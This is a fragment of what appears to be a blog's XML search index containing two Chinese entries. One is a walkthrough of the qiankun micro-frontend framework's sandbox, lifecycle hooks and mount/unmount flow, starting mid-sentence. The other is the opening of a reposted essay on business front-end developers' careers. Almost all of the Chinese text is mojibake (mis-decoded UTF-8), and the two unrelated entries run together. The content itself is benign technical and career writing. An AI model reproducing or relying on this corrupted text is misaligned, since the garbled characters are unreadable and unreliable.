·å¼è¡¨çš„å¤„ç†ï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œä¸»è¦çš„å¤„ç†é€»è¾‘åœ¨ ç¬¬ 68~74 è¡Œï¼Œå¦‚æœå½“å‰å­åº”ç”¨å¤„äºæ¿€æ´»çŠ¶æ€ï¼ˆåˆ¤æ–­å­åº”ç”¨çš„æ¿€æ´»çŠ¶æ€ä¸»è¦æ˜¯å› ä¸ºï¼šå½“ä¸»åº”ç”¨åˆ‡æ¢è·¯ç”±æ—¶å¯èƒ½ä¼šè‡ªåŠ¨æ·»åŠ åŠ¨æ€æ ·å¼è¡¨ï¼Œæ­¤æ—¶éœ€è¦é¿å…ä¸»åº”ç”¨çš„æ ·å¼è¡¨è¢«æ·»åŠ åˆ°å­åº”ç”¨headèŠ‚ç‚¹ä¸­å¯¼è‡´å‡ºé”™ï¼‰ï¼Œé‚£ä¹ˆåŠ¨æ€ style æ ·å¼è¡¨å°±ä¼šè¢«æ·»åŠ åˆ°å­åº”ç”¨å®¹å™¨å†…ï¼ˆè§ä¸‹å›¾ï¼‰ï¼Œåœ¨å­åº”ç”¨å¸è½½æ—¶æ ·å¼è¡¨ä¹Ÿå¯ä»¥å’Œå­åº”ç”¨ä¸€èµ·è¢«å¸è½½ï¼Œä»è€Œé¿å…æ ·å¼æ±¡æŸ“ã€‚åŒæ—¶ï¼ŒåŠ¨æ€æ ·å¼è¡¨ä¹Ÿä¼šå­˜å‚¨åœ¨ dynamicStyleSheetElements æ•°ç»„ä¸­ï¼Œåœ¨åé¢è¿˜ä¼šæåˆ°å…¶ç”¨å¤„ã€‚ æˆ‘ä»¬å†æ¥çœ‹çœ‹å¯¹ script è„šæœ¬æ–‡ä»¶çš„å¤„ç†ï¼ˆè§ä¸‹å›¾ï¼‰ å¯¹åŠ¨æ€ script è„šæœ¬æ–‡ä»¶çš„å¤„ç†è¾ƒä¸ºå¤æ‚ä¸€äº›ï¼Œæˆ‘ä»¬ä¹Ÿæ¥è§£æä¸€æ³¢ï¼š åœ¨ ç¬¬ 83~101 è¡Œ å¤„å¯¹å¤–éƒ¨å¼•å…¥çš„ script è„šæœ¬æ–‡ä»¶ä½¿ç”¨ fetch è·å–ï¼Œç„¶åä½¿ç”¨ execScripts æŒ‡å®š proxy å¯¹è±¡ï¼ˆä½œä¸º window å¯¹è±¡ï¼‰åæ‰§è¡Œè„šæœ¬æ–‡ä»¶å†…å®¹ï¼ŒåŒæ—¶ä¹Ÿè§¦å‘äº† load å’Œ error ä¸¤ä¸ªäº‹ä»¶ã€‚ åœ¨ ç¬¬ 103~106 è¡Œ å¤„å°†æ³¨é‡Šåçš„è„šæœ¬æ–‡ä»¶å†…å®¹ä»¥æ³¨é‡Šçš„å½¢å¼æ·»åŠ åˆ°å­åº”ç”¨å®¹å™¨å†…ã€‚ åœ¨ ç¬¬ 109~113 è¡Œ æ˜¯å¯¹å†…åµŒè„šæœ¬æ–‡ä»¶çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå°±ä¸ä½œå¤è¿°äº†ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå¯¹åŠ¨æ€æ·»åŠ çš„è„šæœ¬è¿›è¡ŒåŠ«æŒçš„ä¸»è¦ç›®çš„å°±æ˜¯ä¸ºäº†å°†åŠ¨æ€è„šæœ¬è¿è¡Œæ—¶çš„ window å¯¹è±¡æ›¿æ¢æˆ proxy ä»£ç†å¯¹è±¡ï¼Œä½¿å­åº”ç”¨åŠ¨æ€æ·»åŠ çš„è„šæœ¬æ–‡ä»¶çš„è¿è¡Œä¸Šä¸‹æ–‡ä¹Ÿæ›¿æ¢æˆå­åº”ç”¨è‡ªèº«ã€‚ HTMLHeadElement.prototype.removeChild çš„é€»è¾‘å°±æ˜¯å¤šåŠ äº†ä¸ªå­åº”ç”¨å®¹å™¨åˆ¤æ–­ï¼Œå…¶ä»–æ— å¼‚ï¼Œå°±ä¸å±•å¼€è¯´äº†ã€‚ æœ€åæˆ‘ä»¬æ¥çœ‹çœ‹ free å‡½æ•°ï¼ˆè§ä¸‹å›¾ï¼‰ è¿™ä¸ª free å‡½æ•°ä¸å…¶ä»–çš„ patchesï¼ˆåŠ«æŒå‡½æ•°ï¼‰ å®ç°ä¸å¤ªä¸€æ ·ï¼Œè¿™é‡Œç¼“å­˜äº†ä¸€ä»½ cssRulesï¼Œåœ¨é‡æ–°æŒ‚è½½çš„æ—¶å€™ä¼šæ‰§è¡Œ rebuild å‡½æ•°å°†å…¶è¿˜åŸã€‚è¿™æ˜¯å› ä¸ºæ ·å¼å…ƒç´  DOM ä»æ–‡æ¡£ä¸­åˆ é™¤åï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨æ¸…é™¤æ ·å¼å…ƒç´ è¡¨ã€‚å¦‚æœä¸è¿™ä¹ˆåšçš„è¯ï¼Œåœ¨é‡æ–°æŒ‚è½½æ—¶ä¼šå‡ºç°å­˜åœ¨ style æ ‡ç­¾ï¼Œä½†æ˜¯æ²¡æœ‰æ¸²æŸ“æ ·å¼çš„é—®é¢˜ã€‚ å¸è½½æ²™ç®± - unmountSandboxæˆ‘ä»¬å†å›åˆ° mount å‡½æ•°æœ¬èº«ï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œåœ¨ patchAtMounting å‡½æ•°ä¸­åŠ«æŒäº†å„ç±»å…¨å±€ç›‘å¬ï¼Œå¹¶è¿”å›äº†è§£é™¤åŠ«æŒçš„ free å‡½æ•°ã€‚åœ¨å¸è½½åº”ç”¨æ—¶è°ƒç”¨ free å‡½æ•°è§£é™¤è¿™äº›å…¨å±€ç›‘å¬çš„åŠ«æŒè¡Œä¸ºï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ° sideEffectsRebuilders åœ¨ free åè¢«è¿”å›ï¼Œåœ¨ mount çš„æ—¶å€™åˆå°†è¢«è°ƒç”¨ rebuild é‡å»ºåŠ¨æ€æ ·å¼è¡¨ã€‚è¿™å—ç¯ç¯ç›¸æ‰£ï¼Œæ˜¯ç¨å¾®æœ‰ç‚¹ç»•ï¼Œæ²¡å¤ªçœ‹æ˜ç™½çš„åŒå­¦å¯ä»¥ç¿»ä¸Šå»å†çœ‹ä¸€éã€‚ åˆ°è¿™é‡Œï¼Œqiankun çš„æœ€æ ¸å¿ƒéƒ¨åˆ†-æ²™ç®±æœºåˆ¶ï¼Œæˆ‘ä»¬å°±å·²ç»è§£æå®Œæ¯•äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­å‰–æåˆ«çš„éƒ¨åˆ†ã€‚ åœ¨è¿™é‡Œæˆ‘ä»¬ç”»ä¸€å¼ å›¾ï¼Œå¯¹æ²™ç®±çš„åˆ›å»ºè¿‡ç¨‹è¿›è¡Œä¸€ä¸ªæ€»æ¢³ç†ï¼ˆè§ä¸‹å›¾ï¼‰ æ³¨å†Œå†…éƒ¨ç”Ÿå‘½å‘¨æœŸå‡½æ•°åœ¨åˆ›å»ºå¥½äº†æ²™ç®±ç¯å¢ƒåï¼Œåœ¨ ç¬¬ 100~106 è¡Œ æ³¨å†Œäº†ä¸€äº›å†…éƒ¨ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼ˆè§ä¸‹å›¾ï¼‰ åœ¨ä¸Šå›¾ä¸­ï¼Œç¬¬ 106 è¡Œ çš„ mergeWith æ–¹æ³•çš„ä½œç”¨æ˜¯å°†å†…ç½®çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ä¸ä¼ å…¥çš„ lifeCycles ç”Ÿå‘½å‘¨æœŸå‡½æ•°ã€‚ è¿™é‡Œçš„ lifeCycles ç”Ÿå‘½å‘¨æœŸå‡½æ•°æŒ‡çš„æ˜¯å…¨å­åº”ç”¨å…±äº«çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼Œå¯ç”¨äºæ‰§è¡Œå¤šä¸ªå­åº”ç”¨é—´ç›¸åŒçš„é€»è¾‘æ“ä½œï¼Œä¾‹å¦‚ åŠ è½½æ•ˆæœ ä¹‹ç±»çš„ã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ é™¤äº†å¤–éƒ¨ä¼ å…¥çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å…³æ³¨ qiankun å†…ç½®çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°åšäº†äº›ä»€ä¹ˆï¼ˆè§ä¸‹å›¾ï¼‰ æˆ‘ä»¬å¯¹ä¸Šå›¾çš„ä»£ç è¿›è¡Œé€ä¸€è§£æï¼š ç¬¬ 13~15 è¡Œï¼šåœ¨åŠ è½½å­åº”ç”¨å‰ beforeLoadï¼ˆåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼‰æ—¶æ³¨å…¥ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒæŒ‡ç¤ºäº†å­åº”ç”¨çš„ public è·¯å¾„ã€‚ ç¬¬ 17~19 è¡Œï¼šåœ¨æŒ‚è½½å­åº”ç”¨å‰ beforeMountï¼ˆå¯èƒ½ä¼šå¤šæ¬¡æ‰§è¡Œï¼‰æ—¶å¯èƒ½ä¹Ÿä¼šæ³¨å…¥è¯¥ç¯å¢ƒå˜é‡ã€‚ ç¬¬ 23~30 è¡Œï¼šåœ¨å¸è½½å­åº”ç”¨å‰ beforeUnmount æ—¶å°†ç¯å¢ƒå˜é‡è¿˜åŸåˆ°åŸå§‹çŠ¶æ€ã€‚ é€šè¿‡ä¸Šé¢çš„åˆ†ææˆ‘ä»¬å¯ä»¥å¾—å‡ºä¸€ä¸ªç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å­åº”ç”¨ä¸­è·å–è¯¥ç¯å¢ƒå˜é‡ï¼Œå°†å…¶è®¾ç½®ä¸º __webpack_public_path__ çš„å€¼ï¼Œä»è€Œä½¿å­åº”ç”¨åœ¨ä¸»åº”ç”¨ä¸­è¿è¡Œæ—¶ï¼Œå¯ä»¥åŒ¹é…æ­£ç¡®çš„èµ„æºè·¯å¾„ã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ è§¦å‘ beforeLoad ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°åœ¨æ³¨å†Œå®Œäº†ç”Ÿå‘½å‘¨æœŸå‡½æ•°åï¼Œç«‹å³è§¦å‘äº† beforeLoad ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œåœ¨ ç¬¬ 108 è¡Œ ä¸­ï¼Œè§¦å‘äº† beforeLoad ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ã€‚ éšåï¼Œåœ¨ ç¬¬ 110 è¡Œ æ‰§è¡Œäº† import-html-entry çš„ execScripts æ–¹æ³•ã€‚æŒ‡å®šäº†è„šæœ¬æ–‡ä»¶çš„è¿è¡Œæ²™ç®±ï¼ˆjsSandboxï¼‰ï¼Œæ‰§è¡Œå®Œå­åº”ç”¨çš„è„šæœ¬æ–‡ä»¶åï¼Œè¿”å›äº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡åŒ…å«äº†å­åº”ç”¨çš„ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼ˆè§ä¸‹å›¾ï¼‰ã€‚ åœ¨ ç¬¬ 112~121 è¡Œ å¯¹å­åº”ç”¨çš„ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°åšäº†ä¸ªæ£€æµ‹ï¼Œå¦‚æœåœ¨å­åº”ç”¨çš„å¯¼å‡ºå¯¹è±¡ä¸­æ²¡æœ‰å‘ç°ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼Œä¼šåœ¨æ²™ç®±å¯¹è±¡ä¸­ç»§ç»­æŸ¥æ‰¾ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ã€‚å¦‚æœæœ€åæ²¡æœ‰æ‰¾åˆ°ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°åˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å­åº”ç”¨ä¸€å®šè¦æœ‰ bootstrap, mount, unmount è¿™ä¸‰ä¸ªç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°æ‰èƒ½è¢« qiankun æ­£ç¡®åµŒå…¥åˆ°ä¸»åº”ç”¨ä¸­ã€‚ è¿™é‡Œæˆ‘ä»¬ç”»ä¸€å¼ å›¾ï¼Œå¯¹å­åº”ç”¨æŒ‚è½½å‰çš„åˆå§‹åŒ–è¿‡ç¨‹åšä¸€ä¸ªæ€»æ¢³ç†ï¼ˆè§ä¸‹å›¾ï¼‰ è¿›å…¥åˆ° mount æŒ‚è½½æµç¨‹åœ¨ä¸€äº›åˆå§‹åŒ–é…ç½®ï¼ˆå¦‚ å­åº”ç”¨èµ„æºã€è¿è¡Œæ²™ç®±ç¯å¢ƒã€ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ç­‰ç­‰ï¼‰å‡†å¤‡å°±ç»ªåï¼Œqiankun å†…éƒ¨å°†å…¶ç»„è£…åœ¨ä¸€èµ·ï¼Œè¿”å›äº†ä¸‰ä¸ªå‡½æ•°ä½œä¸º single-spa å†…éƒ¨çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼ˆè§ä¸‹å›¾ï¼‰ single-spa å†…éƒ¨çš„é€»è¾‘æˆ‘ä»¬åé¢å†å±•å¼€è¯´ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç®€å•ç†è§£ä¸º single-spa å†…éƒ¨çš„ä¸‰ä¸ªç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼š bootstrapï¼šå­åº”ç”¨åˆå§‹åŒ–æ—¶è°ƒç”¨ï¼Œåªä¼šè°ƒç”¨ä¸€æ¬¡ï¼› mountï¼šå­åº”ç”¨æŒ‚è½½æ—¶è°ƒç”¨ï¼Œå¯èƒ½ä¼šè°ƒç”¨å¤šæ¬¡ï¼› unmountï¼šå­åº”ç”¨å¸è½½æ—¶è°ƒç”¨ï¼Œå¯èƒ½ä¼šè°ƒç”¨å¤šæ¬¡ï¼› æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œåœ¨ bootstrap é˜¶æ®µè°ƒç”¨äº†å­åº”ç”¨æš´éœ²çš„ bootstrap ç”Ÿå‘½å‘¨æœŸå‡½æ•°ã€‚ æˆ‘ä»¬è¿™é‡Œå¯¹ mount é˜¶æ®µè¿›è¡Œå±•å¼€ï¼Œçœ‹çœ‹åœ¨å­åº”ç”¨ mount é˜¶æ®µæ‰§è¡Œäº†å“ªäº›å‡½æ•°ï¼ˆè§ä¸‹å›¾ï¼‰ æˆ‘ä»¬è¿›è¡Œé€è¡Œè§£æï¼š ç¬¬ 127~133 è¡Œï¼šå¯¹å•å®ä¾‹æ¨¡å¼è¿›è¡Œæ£€æµ‹ã€‚åœ¨å•å®ä¾‹æ¨¡å¼ä¸‹ï¼Œæ–°çš„å­åº”ç”¨æŒ‚è½½è¡Œä¸ºä¼šåœ¨æ—§çš„å­åº”ç”¨å¸è½½ä¹‹åæ‰å¼€å§‹ã€‚ï¼ˆç”±äºè¿™é‡Œæ˜¯ä¸²è¡Œé¡ºåºæ‰§è¡Œï¼Œæ‰€ä»¥å¦‚æœæŸä¸€å¤„å‘ç”Ÿé˜»å¡çš„è¯ï¼Œä¼šé˜»å¡æ‰€æœ‰åç»­çš„å‡½æ•°æ‰§è¡Œï¼‰ ç¬¬ 134 è¡Œï¼šæ‰§è¡Œæ³¨å†Œå­åº”ç”¨æ—¶ä¼ å…¥çš„ render å‡½æ•°ï¼Œå°† HTML Template å’Œ loading ä½œä¸ºå…¥å‚ã€‚è¿™é‡Œä¸€èˆ¬æ˜¯åœ¨å‘ç”Ÿäº†ä¸€æ¬¡ unmount åï¼Œå†æ¬¡è¿›è¡Œ mount æŒ‚è½½è¡Œä¸ºæ—¶å°† HTML æŒ‚è½½åœ¨æŒ‡å®šå®¹å™¨ä¸­ï¼ˆè§ä¸‹å›¾ï¼‰ ç”±äºåˆå§‹åŒ–çš„æ—¶å€™å·²ç»è°ƒç”¨è¿‡ä¸€æ¬¡ 12&gt; render&gt; ï¼Œæ‰€ä»¥åœ¨é¦–æ¬¡è°ƒç”¨ 12&gt; mount&gt; æ—¶å¯èƒ½å·²ç»æ‰§è¡Œè¿‡ä¸€æ¬¡ 12&gt; render&gt; æ–¹æ³•ã€‚ åœ¨ä¸‹é¢çš„ä»£ç ä¸­ä¹Ÿæœ‰å¯¹é‡å¤æŒ‚è½½çš„æƒ…å†µè¿›è¡Œåˆ¤æ–­çš„è¯­å¥ - if (frame.querySelector(&quot;div&quot;) === nullï¼Œé˜²æ­¢é‡å¤æŒ‚è½½å­åº”ç”¨ã€‚ ç¬¬ 135 è¡Œï¼šè§¦å‘äº† beforeMount å…¨å±€ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼› ç¬¬ 136 è¡Œï¼šæŒ‚è½½æ²™ç®±ï¼Œè¿™ä¸€æ­¥ä¸­æ¿€æ´»äº†å¯¹åº”çš„å­åº”ç”¨æ²™ç®±ï¼ŒåŠ«æŒäº†éƒ¨åˆ†å…¨å±€ç›‘å¬ï¼ˆå¦‚ setIntervalï¼‰ã€‚æ­¤æ—¶å¼€å§‹å­åº”ç”¨çš„ä»£ç å°†åœ¨æ²™ç®±ä¸­è¿è¡Œã€‚ï¼ˆåæ¨å¯çŸ¥ï¼Œåœ¨ beforeMount å‰çš„éƒ¨åˆ†å…¨å±€æ“ä½œå°†ä¼šå¯¹ä¸»åº”ç”¨é€ æˆæ±¡æŸ“ï¼Œå¦‚ setIntervalï¼‰ ç¬¬ 137 è¡Œï¼šè§¦å‘å­åº”ç”¨çš„ mount ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼Œåœ¨è¿™ä¸€æ­¥é€šå¸¸æ˜¯æ‰§è¡Œå¯¹åº”çš„å­åº”ç”¨çš„æŒ‚è½½æ“ä½œï¼ˆå¦‚ ReactDOM.renderã€Vue.$mountã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ ç¬¬ 138 è¡Œï¼šå†æ¬¡è°ƒç”¨ render å‡½æ•°ï¼Œæ­¤æ—¶ loading å‚æ•°ä¸º falseï¼Œä»£è¡¨å­åº”ç”¨å·²ç»åŠ è½½å®Œæˆã€‚ ç¬¬ 139 è¡Œï¼šè§¦å‘äº† afterMount å…¨å±€ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼› ç¬¬ 140~144 è¡Œï¼šåœ¨å•å®ä¾‹æ¨¡å¼ä¸‹è®¾ç½® prevAppUnmountedDeferred çš„å€¼ï¼Œè¿™ä¸ªå€¼æ˜¯ä¸€ä¸ª promiseï¼Œåœ¨å½“å‰å­åº”ç”¨å¸è½½æ—¶æ‰ä¼šè¢« resolveï¼Œåœ¨è¯¥å­åº”ç”¨è¿è¡ŒæœŸé—´ä¼šé˜»å¡å…¶ä»–å­åº”ç”¨çš„æŒ‚è½½åŠ¨ä½œï¼ˆç¬¬ 134 è¡Œï¼‰ï¼› æˆ‘ä»¬åœ¨ä¸Šé¢å¾ˆè¯¦ç»†çš„å‰–æäº†æ•´ä¸ªå­åº”ç”¨çš„ mount æŒ‚è½½æµç¨‹ï¼Œå¦‚æœä½ è¿˜æ²¡æœ‰ææ‡‚çš„è¯ï¼Œæ²¡å…³ç³»ï¼Œæˆ‘ä»¬å†ç”»ä¸€ä¸ªæµç¨‹å›¾æ¥å¸®åŠ©ç†è§£ã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ è¿›å…¥åˆ° unmount å¸è½½æµç¨‹æˆ‘ä»¬åˆšæ‰æ¢³ç†äº†å­åº”ç”¨çš„ mount æŒ‚è½½æµç¨‹ï¼Œæˆ‘ä»¬ç°åœ¨å°±è¿›å…¥åˆ°å­åº”ç”¨çš„ unmount å¸è½½æµç¨‹ã€‚åœ¨å­åº”ç”¨æ¿€æ´»é˜¶æ®µï¼Œ activeRule æœªå‘½ä¸­æ—¶å°†ä¼šè§¦å‘ unmount å¸è½½è¡Œä¸ºï¼Œå…·ä½“çš„è¡Œä¸ºå¦‚ä¸‹ï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œunmount å¸è½½æµç¨‹è¦æ¯” mount ç®€å•å¾ˆå¤šï¼Œæˆ‘ä»¬ç›´æ¥æ¥æ¢³ç†ä¸€ä¸‹ï¼š ç¬¬ 148 è¡Œï¼šè§¦å‘äº† beforeUnmount å…¨å±€ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼› ç¬¬ 149 è¡Œï¼šè¿™é‡Œä¸ mount æµç¨‹çš„é¡ºåºç¨å¾®æœ‰ç‚¹ä¸åŒï¼Œè¿™é‡Œå…ˆæ‰§è¡Œäº†å­åº”ç”¨çš„ unmount ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼Œä¿è¯å­åº”ç”¨ä»ç„¶æ˜¯è¿è¡Œåœ¨æ²™ç®±å†…ï¼Œé¿å…é€ æˆçŠ¶æ€æ±¡æŸ“ã€‚åœ¨è¿™é‡Œä¸€èˆ¬æ˜¯å¯¹å­åº”ç”¨çš„ä¸€äº›çŠ¶æ€è¿›è¡Œæ¸…ç†å’Œå¸è½½æ“ä½œã€‚ï¼ˆå¦‚ä¸‹å›¾ï¼Œé”€æ¯äº†åˆšæ‰åˆ›å»ºçš„ vue å®ä¾‹ï¼‰ ç¬¬ 150 è¡Œï¼šå¸è½½æ²™ç®±ï¼Œå…³é—­äº†æ²™ç®±çš„æ¿€æ´»çŠ¶æ€ã€‚ ç¬¬ 151 è¡Œï¼šè§¦å‘äº† afterUnmount å…¨å±€ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼› ç¬¬ 152 è¡Œï¼šè§¦å‘ render æ–¹æ³•ï¼Œå¹¶ä¸”ä¼ å…¥çš„ appContent ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œæ­¤å¤„å¯ä»¥æ¸…ç©ºä¸»åº”ç”¨å®¹å™¨å†…çš„å†…å®¹ã€‚ ç¬¬ 153~156 è¡Œï¼šå½“å‰å­åº”ç”¨å¸è½½å®Œæˆåï¼Œåœ¨å•å®ä¾‹æ¨¡å¼ä¸‹è§¦å‘ prevAppUnmountedDeferred.resolve()ï¼Œä½¿å…¶ä»–å­åº”ç”¨çš„æŒ‚è½½è¡Œä¸ºå¾—ä»¥ç»§ç»­è¿›è¡Œï¼Œä¸å†é˜»å¡ã€‚ æˆ‘ä»¬å¯¹ unmount å¸è½½æµç¨‹ä¹Ÿç”»ä¸€å¼ å›¾ï¼Œå¸®åŠ©å¤§å®¶ç†è§£ï¼ˆè§ä¸‹å›¾ï¼‰ã€‚ æ€»ç»“åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å¯¹ qiankun æ¡†æ¶çš„æ€»æµç¨‹æ¢³ç†å°±å·®ä¸å¤šäº†ã€‚è¿™é‡Œåº”è¯¥åšä¸ªæ€»ç»“ï¼Œå¤§å®¶çœ‹äº†è¿™ä¹ˆå¤šæ–‡å­—ï¼Œä¼°è®¡å¤§å®¶ä¹Ÿçœ‹ç´¯äº†ï¼Œæœ€åç”¨ä¸€å¼ å›¾å¯¹ qiankun çš„æ€»æµç¨‹è¿›è¡Œæ€»ç»“å§ã€‚ å±•æœ›ä¼ ç»Ÿçš„äº‘æ§åˆ¶å°åº”ç”¨ï¼Œå‡ ä¹éƒ½ä¼šé¢ä¸´ä¸šåŠ¡å¿«é€Ÿå‘å±•ä¹‹åï¼Œå•ä½“åº”ç”¨è¿›åŒ–æˆå·¨çŸ³åº”ç”¨çš„é—®é¢˜ã€‚æˆ‘ä»¬è¦å¦‚ä½•ç»´æŠ¤ä¸€ä¸ªå·¨æ— éœ¸ä¸­å°åº”ç”¨ï¼Ÿ ä¸Šé¢è¿™ä¸ªé—®é¢˜å¼•å‡ºäº†å¾®å‰ç«¯æ¶æ„ç†å¿µï¼Œæ‰€ä»¥å¾®å‰ç«¯çš„æ¦‚å¿µä¹Ÿè¶Šæ¥è¶Šç«ï¼Œæˆ‘ä»¬å›¢é˜Ÿæœ€è¿‘ä¹Ÿåœ¨å°è¯•è½¬å‹å¾®å‰ç«¯æ¶æ„ã€‚ å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œæ‰€ä»¥æœ¬æ–‡é’ˆå¯¹ qiankun çš„æºç è¿›è¡Œè§£è¯»ï¼Œåœ¨åˆ†äº«çŸ¥è¯†çš„åŒæ—¶ä¹Ÿæ˜¯å¸®åŠ©è‡ªå·±ç†è§£ã€‚ è¿™æ˜¯æˆ‘ä»¬å›¢é˜Ÿå¯¹å¾®å‰ç«¯æ¶æ„çš„æœ€ä½³å®è·µï¼ˆè§ä¸‹å›¾ï¼‰ï¼Œå¦‚æœæœ‰éœ€æ±‚çš„è¯ï¼Œå¯ä»¥åœ¨è¯„è®ºåŒºç•™è¨€ï¼Œæˆ‘ä»¬ä¼šè€ƒè™‘å‡ºä¸€ç¯‡ã€Šå¾®å‰ç«¯æ¡†æ¶ qiankun æœ€ä½³å®è·µã€‹æ¥å¸®åŠ©å¤§å®¶æ­å»ºä¸€å¥—å¾®å‰ç«¯æ¶æ„ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>å¾®å‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½ ç´¯æ­»ç´¯æ´»åšä¸šåŠ¡ï¼Œç»©æ•ˆè¿˜ä¸æ€ä¹ˆæ ·ï¼Œæˆ‘åªèƒ½å¸®ä½ åˆ°è¿™äº†â€¦â€¦]]></title>
    <url>%2F2020%2F05%2F29%2F%E5%85%B6%E4%BB%96%2F%E4%BD%A0%E7%B4%AF%E6%AD%BB%E7%B4%AF%E6%B4%BB%E5%81%9A%E4%B8%9A%E5%8A%A1%EF%BC%8C%E7%BB%A9%E6%95%88%E8%BF%98%E4%B8%8D%E6%80%8E%E4%B9%88%E6%A0%B7%EF%BC%8C%E6%88%91%E5%8F%AA%E8%83%BD%E5%B8%AE%E4%BD%A0%E5%88%B0%E8%BF%99%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/TU6rvx6vWQWROaxqO3qDsA \å‰è¨€** ä½œä¸ºä¸€ä¸ªä¸šåŠ¡å‰ç«¯ï¼Œå®Œæˆä¸šåŠ¡éœ€æ±‚çš„åŒæ—¶ï¼Œè¿˜è¦å¤„ç†å„ç§çº¿ä¸Šé—®é¢˜ï¼ŒåŠ ç­è¾›è‹¦å¿™ç¢Œäº†ä¸€å¹´ï¼Œè¿˜è¦è¢«è€æ¿è¯´â€œæ€è€ƒæ˜¯ä¸å¤Ÿçš„â€ã€â€œæ²¡æœ‰ä¸šåŠ¡ senceâ€ï¼Œå‡ºå»é¢è¯•ï¼Œè¢«é—®é¡¹ç›®ï¼Œä¹Ÿè¯´ä¸å‡ºä»€ä¹ˆæœ‰äº®ç‚¹æˆ–è€…æœ‰æŒ‘æˆ˜çš„ä¸œè¥¿ï¼Œæƒ³åšç‚¹ç‰›é€¼çš„ä¸œè¥¿ï¼Œä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ä»·å€¼çš„æ–¹å‘ï¼Œå¥½ä¸å®¹æ˜“æ‰¾åˆ°ä¸€äº›æ–¹å‘ï¼Œè¿˜è¦è¢«è€æ¿ä¸€é¡¿è´¨é—®ï¼Œä¸šåŠ¡ä»·å€¼æ˜¯ä»€ä¹ˆï¼ŸROI æ€æ ·ï¼Ÿæœ€ç»ˆå¯èƒ½å°±åªæ˜¯åšäº†ä¸€ç‚¹æ€§èƒ½ä¼˜åŒ–å·¥ä½œï¼ŒæŠ½ç¦»äº†ä¸€äº›å¯å¤ç”¨çš„ç»„ä»¶â€¦â€¦ä¸ç¦è®©äººæ„Ÿå¹ï¼Œä¸šåŠ¡éš¾ã€å‰ç«¯éš¾ã€åšä¸šåŠ¡çš„å‰ç«¯æ›´éš¾ï¼ å¦‚æœä½ ä¹Ÿæœ‰è¿™æ ·çš„æ„Ÿå—å’Œå›°å¢ƒï¼Œæˆ‘æƒ³å‘Šè¯‰ä½ ï¼Œè¿™çœŸçš„æ˜¯å¤ªæ­£å¸¸äº†ï¼Œåœ¨é˜¿é‡Œå†…éƒ¨çš„æŠ€æœ¯è®ºå›å°±æœ‰å¤šç¯‡å…³äºè¿™ä¸ªé—®é¢˜çš„æ€è€ƒï¼Œæˆ‘æ ¹æ®æ ¹æ®è‡ªå·±ç†è§£å’Œè°ƒç ”ï¼ŒåŒæ—¶å‚è€ƒäº†å¤šä½ä¸åŒå‰ç«¯é¢†åŸŸä¸“å®¶çš„æ€»ç»“ï¼Œæ•´ç†æˆè¿™ç¯‡æ–‡ç« ï¼Œå¸Œæœ›èƒ½å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©ã€‚ \ä¸šåŠ¡å‰ç«¯çš„å›°å¢ƒ**â– 